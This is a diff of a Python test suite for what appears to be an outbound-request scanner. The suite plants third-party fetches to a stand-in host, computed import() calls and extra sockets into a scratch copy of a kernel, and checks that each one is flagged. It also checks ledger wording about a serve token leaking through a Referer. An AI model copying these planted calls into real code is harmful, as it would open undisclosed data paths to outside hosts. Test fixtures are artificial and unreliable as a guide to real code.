+    pass, served_pass; a run over a planted copy before the fifth round): a third-party fetch, a second socket and a second
+    opener in _TIMELINE_BOOT (the fetch UNCLASSIFIED, the two rowed tools moving their keys' counts: the keyed-by-tool
     residual), a brace-led alert and an import statement there (the narrowed import gate), a sendBeacon in the settings page's
     template (UNCLASSIFIED at the template's own lines), a route serving a file the walk does not scan and a method serving
     text/html from a parameter (each a SERVED line by name), an f-string page (its fetch UNCLASSIFIED: the branch executed) and
-    a page whose fetch URL is a Python format slot (the computed class). At the tree the shim's and the shell's sockets, the
-    boot's dead opener and the worker's clients.openWindow list on local-kernel, the four fetches whose route literal a caller
-    passes list as computed, and the four pane stylesheets are named, not scanned. The pass is the class's alone: its import
-    plant would join the credentials run's IMPORT set, which that run's case holds equal to its own lines; the served-pass
-    mutation (M21) is a run of its own over the copy, as every script mutation is."""
+    a page whose fetch URL is a Python format slot (the computed class). Since the fifth round F, G and H's plants ride the same
+    pass, each held under its own subTest: F's routes (a type read through a module constant, ctype=, a local and mixed case,
+    and image/svg+xml, application/xhtml+xml and application/javascript, each page's fetch UNCLASSIFIED; a Content-Type written
+    outside _send, a body read from a file the walk does not scan and a type a function returns, each a SERVED line), the
+    allowlist's two gates (F11, an entry left naming nothing; F12, a third place under the /dist entry's key), G's pages (read
+    through .encode, .format_map, .get with a default, subscripts, a class attribute, a chain two calls deep and same-named
+    locals in two functions, each fetch UNCLASSIFIED; a receiver a function or a method returns and a run-time memo, each a
+    SERVED line) and H's reads (a fetch after local ones in a joined constant, a joined constant led by `*{`, a second and
+    computed import( on a line, a multi-line f-string's later part, two identical parts on two lines and two identical
+    constants on one line, each at its own line, and the residual's three shapes, each held at the line it is listed at).
+    None adds a
+    socket or an opener, so the rowed keys' counts move by the boot's two plants alone. At the tree the shim's and the shell's
+    sockets, the boot's dead opener and the worker's clients.openWindow list on local-kernel, the four fetches whose route
+    literal a caller passes list as computed, and the four pane stylesheets are named, not scanned. The pass is the class's
+    alone: its import plant would join the credentials run's IMPORT set, which that run's case holds equal to its own lines;
+    the served-pass mutation (M21) is a run of its own over the copy, as every script mutation is."""
 
     def setUp(self):
         """The pass, built on the first case's setUp in the process and parse_cache's memo after (served_pass): the plants' lines
@@ -1835,6 +2283,134 @@ class TheServedPagesAreScanned(_Scope):
         self.assertRefused(self.rc, out, "IMPORT kernel/kernel.py:%d imports example-pkg" % self.at["import"])
         self.assertNotIn("IMPORT kernel/kernel.py:%d " % self.at["alert"], out, "a brace-led line with `from` in a string is any block's last line in a page's script, not an import")
 
+    def assertFetchUnclassifiedAt(self, n, tag, why):
+        """A plant page's fetch (FGH_PAGE with `tag`) is named on the UNCLASSIFIED line at line n of the planted kernel.py and
+        listed at that line with no road."""
+        self.assertIn("kernel/kernel.py:%d" % n, unclassified(self.out), "%s: the page's fetch is UNCLASSIFIED at line %d\n%s" % (why, n, gates(self.out)))
+        self.assertListed(self.out, r"^kernel/kernel\.py:%d  fetch  fetch\('https://example\.invalid/%s'\)  in -  -> UNCLASSIFIED$" % (n, re.escape(tag)), why)
+
+    def test_a_routes_type_is_read_through_a_constant_a_keyword_a_local_and_every_script_running_type(self):
+        """F of the fifth round, a route's content type: each plant is a do_GET branch, and since the fifth round a `_send`
+        call's type is read through the parameter Handler._send's Content-Type line names, module constants and locals, cut at
+        `;`, stripped, lower-cased and compared with SCRIPT_TYPES. F1 (a module constant's type), F2 (ctype=), F3 (Text/HTML;
+        Charset=UTF-8), F4 (image/svg+xml), F5 (application/xhtml+xml), F6 (application/javascript) and F8 (a local's type)
+        each list their page's fetch UNCLASSIFIED at its own line; F7 (a Content-Type header written outside _send), F9 (a
+        body read from a file the walk does not scan, under a module constant's type) and F10 (a type a function returns) are
+        each a SERVED line at their own line. The arm whose removal reds each: the module-constant read of _ctype_values for
+        F1 and F9 (a SERVED line for a type the census cannot resolve in place of the listing or the file's line), the keyword
+        read for F2 and the local read for F8 (that SERVED line in place of the listing), the essence's normalization for F3
+        and the type list for F4 to F6 (each page silent), the judging of a Content-Type written outside _send for F7 and the
+        refusal of an unresolved type for F10 (each silent). The reviewed head, whose routes were `_send` calls with a
+        text/html or text/javascript literal, prints none of these lines."""
+        for plant, tag in FGH_TYPED:
+            with self.subTest(plant=plant):
+                self.assertFetchUnclassifiedAt(self.at[tag], tag, "the route's type is read and runs script: its page is scanned")
+        for plant, tag, line in FGH_TYPE_REFUSED:
+            with self.subTest(plant=plant):
+                self.assertRefused(self.rc, self.out, line % self.at[tag])
+
+    def test_the_allowlist_names_an_entry_that_names_nothing_and_a_new_place_under_an_entrys_key(self):
+        """The served allowlist's two gates (F of the fifth round). F11 respells the one place the Handler._file_slice entry
+        covers, its type argument `ctype`, as the literal "application/json", one of the two types _slice_body returns: the
+        entry names nothing and the stale-entry gate's line names it, and the respelled place, now a type that runs no script,
+        is passed with no line of its own (asserted too, so the plant accounts for everything it prints). Of the entries that
+        cover one place, this respelling prints the fewest lines: do_OPTIONS's or _ws's bodiless answer respelled adds a SERVED
+        line for an answer with no Content-Type, and a memo's, the relay's or the names registry's respelled adds a SERVED line
+        for its container or read, while _file_slice's place, once spelled, resolves and is passed. F12 is a do_GET branch whose
+        type is `ct + "; charset=utf-8"`, the /dist and /media entry's key: the entry excuses the route (no line names it, its
+        page unread), and the count gate names the third place under a key that covers two. The arm whose removal reds each:
+        the stale-entry gate for F11 and the count gate for F12, each then silent. The reviewed head has no allowlist, so
+        neither line is printed there."""
+        out, at = self.out, self.at
+        with self.subTest(plant="F11 an allowlist entry that names nothing"):
+            self.assertRefused(self.rc, out, "SERVED ALLOW %s %r names nothing this run reads" % SLICE_KEY)
+            self.assertIsNone(re.search(r"kernel/kernel\.py:%d(?!\d)" % at["slice"], out),
+                              "the respelled place resolves to application/json and is passed: no line names it\n" + gates(out))
+        with self.subTest(plant="F12 a third place under the /dist and /media entry's key"):
+            self.assertRefused(self.rc, out, "SERVED ALLOW %s %r covers %d places, the entry says %d" % (DIST_KEY + (DIST_PLACES + 1, DIST_PLACES)))
+            self.assertIsNone(re.search(r"kernel/kernel\.py:%d(?!\d)" % at["f12"], out),
+                              "the key excuses the route and its page is not read: the count gate is the one line that names it\n" + gates(out))
+
+    def test_a_page_is_read_through_encode_format_map_its_containers_and_class_attributes(self):
+        """G of the fifth round, the receivers and containers a page's text is read through. G1 (.encode on a function's
+        return), G1b (.encode on a module constant), G2 (.get with a default on a module dict), G3 (a module dict's subscript
+        joined with a literal), G4 (.format_map on a module constant), G4b (.format_map on a function's return), G5 (a class
+        attribute), G6 (a subscript of a module dict that holds a number too), G9 (.get, .strip and .encode on a module dict)
+        and G15 (two functions each binding a local named body, the page's fetch in the second's) each list their page's fetch
+        UNCLASSIFIED at the line that holds it; G7 and G10 (a receiver a function returns, one and two calls deep), G11 (a
+        receiver a method returns) and G8 (a module container a function writes at run time) are each a SERVED line at the
+        route. The arm whose removal reds each: the follow of .encode and .format_map for G1 and G4b (a SERVED line for the
+        function's return in its place) and for G10, whose line names the receiver inside its .encode (without the follow
+        the line names the whole chain), that follow and the name read together for G1b and G4 (either alone keeps them
+        read), the name read for G2, G3, G6 and G9, the class-attribute read for G5, the refusal of a receiver the pass does
+        not read for G7, G10 and G11 (each then silent), the memo rule for G8, and holding each function's map of locals for
+        the whole pass for G15 (without it a later map can take a freed map's id and the second function's local is skipped,
+        which happens on 3.10 and the free-threaded 3.14 and not on 3.11 or 3.12). At the reviewed head G15 is caught or
+        silent by interpreter as that says, and the others print none of these lines."""
+        for plant, tag in FGH_READ:
+            with self.subTest(plant=plant):
+                self.assertFetchUnclassifiedAt(self.at[tag], tag, "the page's text is read through its receiver or container")
+        for plant, tag, line in FGH_REFUSED:
+            with self.subTest(plant=plant):
+                self.assertRefused(self.rc, self.out, line % self.at[tag])
+
+    def test_served_text_is_read_per_match_with_no_comment_skip_each_site_at_its_parts_line(self):
+        """H of the fifth round, how served text is read per line. H1 adds a third-party fetch after the local fetches of the
+        drift banner's joined script (_RDRIFT_JS), UNCLASSIFIED at the constant's first line (the line after `_RDRIFT_JS = (`,
+        the one-line rule for a joined constant); H2 leads the banner's joined stylesheet (_RDRIFT_CSS) with a `*{` part that
+        carries a page's fetch, UNCLASSIFIED at that line; H4 serves a line with a literal import( and then a computed one,
+        the second listed as the computed class, the import() key's count going from none to one and the computed class's
+        count moved by it and the format slot (SERVED_COMPUTED_PLANTS), each figure from the committed counts; H5 puts a
+        fetch in a multi-line f-string's later part, UNCLASSIFIED at the fetch's own line and not at the f-string's first;
+        H6 serves two identical parts on different lines, each UNCLASSIFIED at its own line and both listed; H7 serves two
+        identical constants on one line, both sites. The arm whose removal reds each: reading every fetch( and import( on a
+        line by its own argument for H1 and H4 (each silent), dropping the comment skip over served text for H2 (silent), each
+        part's own line for H5 and H6 (H5 listed one line early, at the f-string's first line; H6's second part listed at the
+        first part's line), and the dedupe keyed on the part rather than its line and text for H7 (one site). The reviewed
+        head is silent on H1, H2 and H4, lists H5 one line early and lists H6 and H7 once. Beside them the residual
+        SERVED_LINE_RESIDUAL states, held by three plants at the line each is listed at: R1, a `}` on a later line than its
+        expression, and R2, a literal after a formatted value on the next line, each listed at its own line on 3.12 and later
+        and one line early on 3.10 and 3.11 (the reviewed head listed both early everywhere); R3, text joined across two
+        literals, listed at the first literal's line on every interpreter."""
+        out, at = self.out, self.at
+        with self.subTest(plant="H1 a fetch after local ones in a joined constant"):
+            self.assertFetchUnclassifiedAt(at["drift_js"] + 1, "h1", "every fetch( on the joined constant's one line is read, at its first line")
+        with self.subTest(plant="H2 a joined constant led by *{"):
+            self.assertFetchUnclassifiedAt(at["h2"], "h2", "served text has no comment skip: a part led by *{ is read")
+        with self.subTest(plant="H4 a second, computed import( on a line"):
+            self.assertListed(out, r"^kernel/kernel\.py:%d  import\(\)  import\(location\.hash\.slice\(1\)\)  in -  -> \(browser-computed-url\)$" % at["h4"],
+                              "every import( on a line is read by its own argument")
+            expected = _expected()
+            imports, computed = expected["per_key"].get("kernel/kernel.py:import()"), expected["classes"]["browser-computed-url"]
+            self.assertRefused(self.rc, out,
+                               "COUNTS per_key kernel/kernel.py:import(): the committed count is %s, this run found %d" % (imports, (imports or 0) + 1),
+                               "COUNTS classes browser-computed-url: the committed count is %d, this run found %d" % (computed, computed + len(SERVED_COMPUTED_PLANTS)))
+        with self.subTest(plant="H5 a site in a multi-line f-string's later part"):
+            self.assertFetchUnclassifiedAt(at["h5"], "h5", "a part's site at the part's own line")
+            self.assertNotIn("kernel/kernel.py:%d" % at["h5_open"], unclassified(out), "not one line early, at the f-string's first line")
+        with self.subTest(plant="H6 two identical parts on different lines"):
+            for key in ("h6_first", "h6_second"):
+                self.assertFetchUnclassifiedAt(at[key], "h6", "each identical part at its own line")
+            listed = [ln for ln in out.splitlines() if SITE_LINE.match(ln) and _fgh_mark("h6") in ln]
+            self.assertEqual(len(listed), 2, "both parts are sites, each counted once: %r" % listed)
+        with self.subTest(plant="H7 two identical constants on one line"):
+            self.assertFetchUnclassifiedAt(at["h7"], "h7", "the line's pieces are read")
+            listed = [ln for ln in out.splitlines() if SITE_LINE.match(ln) and _fgh_mark("h7") in ln]
+            self.assertEqual(len(listed), 2, "the dedupe is keyed on the part, not its line and text, so both constants are sites: %r" % listed)
+        # the residual SERVED_LINE_RESIDUAL states, each plant holding the line it is listed at (the ruling's residual plants)
+        late = sys.version_info >= (3, 12)
+        with self.subTest(plant="R1 a closing brace on a later line than its expression"):
+            n, early = (at["r1"], at["r1_open"]) if late else (at["r1_open"], at["r1"])
+            self.assertFetchUnclassifiedAt(n, "r1", "listed at the part's own line on 3.12 and later, at the expression's line on 3.10 and 3.11")
+            self.assertNotIn("kernel/kernel.py:%d" % early, unclassified(out))
+        with self.subTest(plant="R2 a literal after a formatted value on the next line"):
+            n, early = (at["r2"], at["r2_value"]) if late else (at["r2_value"], at["r2"])
+            self.assertFetchUnclassifiedAt(n, "r2", "listed at the literal's own line on 3.12 and later, at the formatted value's line on 3.10 and 3.11")
+            self.assertNotIn("kernel/kernel.py:%d" % early, unclassified(out))
+        with self.subTest(plant="R3 text merged across concatenated literals"):
+            self.assertFetchUnclassifiedAt(at["r3_open"], "r3", "a site in text joined across literals is listed at the first part's line")
+            self.assertNotIn("kernel/kernel.py:%d" % at["r3"], unclassified(out), "on every interpreter")
+
     def test_the_served_texts_own_sites_are_rowed_or_computed_and_its_stylesheets_named(self):
         rc, out, _ = tree_run()
         self.assertClean(rc, out)
@@ -1865,14 +2441,25 @@ class TheServedPagesAreScanned(_Scope):
                            "STALE ROW kernel/kernel.py:clients.openWindow names no site",
                            "COUNTS per_key kernel/kernel.py:fetch: the committed count is %d, this run found None" % expected["per_key"]["kernel/kernel.py:fetch"])
 
+    def test_the_command_line_over_a_copy_carrying_the_plants_prints_the_pass(self):
+        """The pass's equality, executed (the fifth round of the review, 2026-09-23; fresh-1, tests-2, extra6-5, extra7-5): the file
+        run as the command line runs it (_command_line), over the scope copy with kernel/kernel.py carrying exactly the pass's plants
+        (the text _served_text writes, the text the pass parses), exits 1 and prints the pass's stdout byte for byte. The pass starts
+        from the tree's one derivation (_tree), so this one case holds the tree derivation, the splice and the entry's exit code
+        against a real run: a scan() route filter, a scan() that drops a served file's sites, a Result field the splice does not
+        carry, a splice line dropped and a lost exit code are each red here (M35 to M39 in the round's record). One full scan, in a
+        child. A case of its own and not a shared run's member: its import plant would join the credentials run's IMPORT set."""
+        self.plant(KERNEL_PATH, _served_text(KERNEL))
+        self.assertCommandLine(scope_copy(), self.rc, self.out, timeout=300)
+
 
 class TheChatMediaRoadIsRowed(_Scope):
     """A rendered message's media on the web dashboard is a road (the fourth round, tests-1): the pipeline's one line on a
     message's pictures before the browser fetches them, `mdImgPostPass(clean)` in md() and in userMd(), is the row's site (two
     lines, keyed ui/webview/render.ts:mdImgPostPass, through a JS entry whose lookbehind keeps the definition in preview.ts out),
-    and the table's row states the render as the trigger, the cross-site cookies and no Referer as what is sent (save an inline svg's
-    paint references, whose request can carry the dashboard's address with the serve token in its Referer, one text with the
-    section's sentence), and no switch.
+    and the table's row states the render as the trigger, whatever cookies that browser sends to that host and no Referer to any other origin as what is
+    sent (save an inline svg's paint references, whose request can carry the dashboard's address with the serve token in its
+    Referer, one text with the section's sentence), and no switch.
     The executed witness is ui/webview/chat-media-loads-browser.test.ts (the request events of a page served under the
     dashboard's headers, and the editor CSP scene), which skips without a browser; tests/test_security_price_feed.py holds the
     section's sentence and the row's cells to the same words."""
@@ -1898,11 +2485,14 @@ class TheChatMediaRoadIsRowed(_Scope):
         for phrase in ("a session's reply (`md`", "your own message (`userMd`", "a postal body (`md` in `renderPostalService`", "`video` (src, poster)", "an inline svg's `image`",
                        "the editor extension's webviews block these loads by their CSP"):
             self.assertIn(phrase, cells[2], "the trigger cell names the population and the editor's block")
-        for phrase in ("with the cross-site cookies that browser sends to that host", "no Referer (every page the kernel serves carries `Referrer-Policy: same-origin`)",
-                       CHAT_MEDIA_PAINT):
-            self.assertIn(phrase, cells[3], "the sent cell: the host the URL names, the cookies a cross-site subresource carries, no Referer, and the one case "
-                          "whose request can carry the dashboard's address with the serve token in its Referer, an inline svg's paint references")
+        for phrase in (CHAT_MEDIA_COOKIES, "no Referer to any other origin (every page the kernel serves carries `Referrer-Policy: same-origin`)", CHAT_MEDIA_PAINT):
+            self.assertIn(phrase, cells[3], "the sent cell: the host the URL names, whatever cookies that browser sends to that host, no Referer to any other origin, and "
+                          "the one case whose request can carry the dashboard's address with the serve token in its Referer, an inline svg's paint references")
+        for words in CHAT_MEDIA_COOKIES_WITHDRAWN:
+            self.assertNotIn(words, cells[3], "the withdrawn cookie words are absent from the sent cell: %r" % words)
         self.assertNotIn(CHAT_MEDIA_NO_TOKEN_WITHDRAWN, cells[3], "the sent cell no longer claims that no token rides: a paint reference's Referer can carry the serve token")
+        self.assertIn(PAINT_TOKEN_CONDITION, cells[3], "the token half is conditioned (fresh-2): the full page address with the serve token only "
+                      "when the page's own address carries ?token=, not from every framed dashboard page")
         self.assertEqual(cells[4], "none: no setting gates a message's media (the gear's Pictures from the web in files list gates a viewed file's figures, not the chat's)")
         self.assertTrue(os.path.isfile(os.path.join(ROOT, "ui", "webview", "chat-media-loads-browser.test.ts")), "the executed witness is in the tree")
 
@@ -1921,6 +2511,8 @@ class TheChatMediaRoadIsRowed(_Scope):
         self.assertIn(CHAT_MEDIA_PAINT, paragraphs[0], "the entry's census paragraph carries the paint-reference clause the section and "
                       "the sent cell carry: an inline svg's paint references are the one case whose request can carry the dashboard's "
                       "address with the serve token in its Referer")
+        self.assertIn(CHAT_MEDIA_COOKIES, paragraphs[0], "the entry's census paragraph carries the cookie clause the section and the sent cell carry")
+        self.assertNotIn(CHAT_MEDIA_COOKIES_WITHDRAWN[0], paragraphs[0], "the withdrawn cookie words are absent from the census paragraph")
 
     def test_the_row_dropped_and_the_lookbehind_removed_leave_the_sites_unclassified_and_the_definition_a_site(self):
         """M22: the T row deleted and the JS entry's lookbehind removed in one scratch copy of the script."""
@@ -1989,9 +2581,10 @@ class TheKindOfReadsADottedHooksShebang(_Scope):
 
 
 class TheTableIsTheLedgers(_Scope):
-    """--table prints the ledger's table from the sites: one row per road, the local row, one row per class this scan cannot
-    see, and the row of the class it cannot see at all (named, not counted); and the ledger entry carries exactly that output
-    between its two marker lines, so a hand-written cell cannot survive."""
+    """--table prints the ledger's table from the sites: one row per road, the .svg tab row (named and not counted), the local
+    row, one row per class this scan cannot see, the paint row (named and not counted) and the row of the class it cannot see
+    at all (named, not counted); and the ledger entry carries exactly that output between its two marker lines, so a
+    hand-written cell cannot survive."""
 
     def test_the_table_has_a_row_per_road_the_local_row_the_four_classes_and_the_unseen_row(self):
         rc, table, err = tree_run("--table")
@@ -2001,10 +2594,14 @@ class TheTableIsTheLedgers(_Scope):
         self.assertEqual(lines[0], "| road | where | trigger and cadence | what is sent and to where | off switch |")
         self.assertEqual(lines[1], "|---|---|---|---|---|")
         rows = lines[2:]
-        self.assertEqual(len(rows), expected["roads"] - expected["local_roads"] + 1 + 4 + 1, "a row per road, the local row, the four counted classes, the unseen row")
+        self.assertEqual(len(rows), expected["roads"] - expected["local_roads"] + 1 + 1 + 4 + 1 + 1,
+                         "a row per road, the .svg tab row (named, not counted), the local row, the four counted classes, the paint row (named, "
+                         "not counted), the unseen row")
         for r in rows:
             self.assertEqual(len(r.split(" | ")), 5, r[:120])
-        self.assertTrue(rows[-6].startswith("| local, set aside and counted (local) | %d sites on the %d local roads" % (expected["local_sites"], expected["local_roads"])))
+        self.assertTrue(rows[-8].startswith("| %s | not counted: " % SVG_TAB_LABEL), "the .svg tab row stands after the roads, named and not counted")
+        self.assertTrue(rows[-7].startswith("| local, set aside and counted (local) | %d sites on the %d local roads" % (expected["local_sites"], expected["local_roads"])))
+        self.assertTrue(rows[-2].startswith("| %s | not counted: " % PAINT_ROW_LABEL), "the paint row stands beside the browser-dom-loads row, named and not counted")
         self.assertTrue(rows[-1].startswith("| %s | not counted: " % UNSEEN_LABEL), "the last row is the class the scan cannot see, named and not counted")
         self.assertIn("| an external program started whose far end its arguments do not show (not derivable by this scan) | %d sites, by program:" % expected["classes"]["external-program"], table)
         self.assertIn("| a browser request whose URL is computed at run time (not derivable by this scan) | %d sites:" % expected["classes"]["browser-computed-url"], table)
